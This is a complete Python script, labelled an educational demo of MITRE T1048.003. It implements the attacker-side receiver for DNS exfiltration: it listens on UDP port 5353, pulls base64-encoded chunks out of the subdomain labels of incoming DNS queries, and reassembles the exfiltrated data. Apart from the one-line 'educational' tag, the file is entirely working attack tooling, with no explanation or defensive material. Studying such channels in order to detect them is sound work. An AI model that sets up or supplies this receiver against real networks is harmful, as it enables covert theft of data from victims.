#!/usr/bin/env python3
"""
T1048.003 – DNS Exfiltration Receiver (Educational Demo)
Listens on UDP port 5353 and captures data encoded in DNS subdomain queries.
Usage: sudo python3 dns_exfil_server.py
"""
import socket, base64, sys

def decode_chunk(label):
    try:
        label = label.replace('-', '+').replace('_', '/')
        padding = 4 - len(label) % 4
        if padding != 4: label += '=' * padding
        return base64.b64decode(label).decode('utf-8', errors='replace')
    except: return f"[raw:{label}]"

def run_server(port=5353):
    print(f"[*] DNS exfil receiver on UDP:{port} (press Ctrl+C to stop)")
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        sock.bind(('0.0.0.0', port))
        received = []
        while True:
            data, addr = sock.recvfrom(512)
            # Extract subdomain from DNS query packet (simplified)
            if len(data) > 12:
                labels = []; i = 12
                while i < len(data) and data[i] != 0:
                    length = data[i]; i += 1
                    label = data[i:i+length].decode('utf-8', errors='ignore')
                    labels.append(label); i += length
                if labels and labels[0] not in ('attacker', 'dns', 'exfil'):
                    chunk = decode_chunk(labels[0])
                    received.append(chunk)
                    print(f"  [recv] {labels[0]} → {chunk}")
    except KeyboardInterrupt:
        print(f"\n[+] Received {len(received)} chunks")
        print("[+] Reconstructed data:", ''.join(received))
    finally:
        sock.close()

if __name__ == '__main__':
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 5353
    run_server(port)
